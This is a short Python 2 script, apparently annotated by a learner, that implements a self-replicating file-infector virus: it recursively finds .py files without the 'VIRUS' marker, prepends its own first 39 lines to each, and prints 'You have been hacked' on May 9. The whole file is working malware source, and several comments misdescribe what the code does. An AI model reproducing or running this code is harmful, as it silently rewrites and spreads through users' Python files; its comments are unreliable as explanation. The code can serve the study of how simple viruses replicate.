#!/usr/bin/python
import os #importing bash commands
import datetime #importing commands to manipulate dates and times

SIGNATURE = "VIRUS" #represents the call signature of a function and its return annotation

def locate(path): #this defines a function used to find a filepath
    files_targeted = [] #this is a variable referring to an open list
    filelist = os.listdir(path) #puts a list of directories into a variable operating on another variable called path
    for fname in filelist: #this is a for loop calling to the variable fname in the variable filelist established previously
        if os.path.isdir(path+"/"+fname): #start of a conditional looking for a filepath and filename
            files_targeted.extend(locate(path+"/"+fname)) #I think this is looking for a particular file extension
        elif fname[-3:] == ".py": #Looks for the file on the list 3rd from the end
            infected = False #checks if that line is considered infected
            for line in open(path+"/"+fname): #starts a for loop under the filepath/name
                if SIGNATURE in line: #looks to see if the line has the signature in it
                    infected = True #if it is infected
                    break #then breaks the loop
            if infected == False: #otherwise checks if its false
                files_targeted.append(path+"/"+fname) #appends the filepath/name
    return files_targeted #puts the files targeted

def infect(files_targeted): #defines a function that infects the files targeted
    virus = open(os.path.abspath(__file__)) #refers to a filepath in the operating system as a variable and opens it
    virusstring = "" #creates an empty string as a variable
    for i,line in enumerate(virus): #starts a for loop to get a value from the virus variable
        if 0 <= i < 39: #if 0 is less than or equal to i, i is less than 39
            virusstring += line #appends a line to the empty virus string
    virus.close #closes the file
    for fname in files_targeted: #for loop for filenames within thetarget files
        f = open(fname) #opens the file under the f variable
        temp = f.read() #reads the file under the temp variable
        f.close() #closes the file
        f = open(fname,"w") #opens the file in write mode
        f.write(virusstring + temp) #writes the string in addition to the temp variable
        f.close() #closes the file

def detonate(): #defines the function to detonate or activate the virus
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9: #an if statement looking for a particular date/time
        print "You have been hacked" #hahaha

files_targeted = locate(os.path.abspath("")) #puts the filepath into a variable
infect(files_targeted) #performs the above function on the target files
detonate() #performs the activation of the virus

